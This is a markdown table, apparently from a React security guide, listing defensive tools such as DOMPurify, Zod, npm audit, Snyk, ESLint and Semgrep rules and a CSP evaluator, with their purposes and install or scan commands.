| Tool | Purpose | Command |
|------|---------|---------|
| [DOMPurify](https://github.com/cure53/DOMPurify) | Allowlist-based HTML sanitizer for React | `npm install dompurify @types/dompurify` |
| [serialize-javascript](https://github.com/yahoo/serialize-javascript) | Safe JSON serialization for SSR `<script>` embedding | `npm install serialize-javascript` |
| [Zod](https://zod.dev) | Runtime schema validation for API responses and params | `npm install zod` |
| [npm audit](https://docs.npmjs.com/cli/v10/commands/npm-audit) | Checks installed packages against the npm advisory database | `npm audit --audit-level=high` |
| [Snyk](https://snyk.io) | Dependency vulnerability scanning with fix PRs | `npx snyk test` |
| [ESLint react-security rules](https://github.com/nicolo-ribaudo/eslint-plugin-react-security) | Lints for `dangerouslySetInnerHTML`, `eval`, and URL injection | `eslint --plugin react-security` |
| [CSP Evaluator](https://csp-evaluator.withgoogle.com/) | Analyzes your Content Security Policy for bypasses | Web UI |
| [react-content-security-policy-strict](https://github.com/nicolo-ribaudo/react-csp) | Generates nonce-based CSP for React SSR | — |
| [Semgrep React rules](https://semgrep.dev/r?lang=js&search=react) | Static analysis patterns for React security anti-patterns | `semgrep --config=r/javascript.react .` |
